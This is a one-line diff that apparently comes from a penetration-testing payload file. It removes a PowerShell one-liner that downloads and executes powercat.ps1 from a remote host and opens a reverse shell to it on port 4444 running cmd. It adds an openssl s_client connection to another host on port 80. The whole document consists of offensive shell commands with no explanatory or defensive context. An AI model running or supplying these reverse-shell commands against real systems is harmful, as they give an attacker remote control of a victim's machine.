@@ -1,1 +1,1 @@
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"
+openssl s_client -quiet -connect 192.168.226.1:80
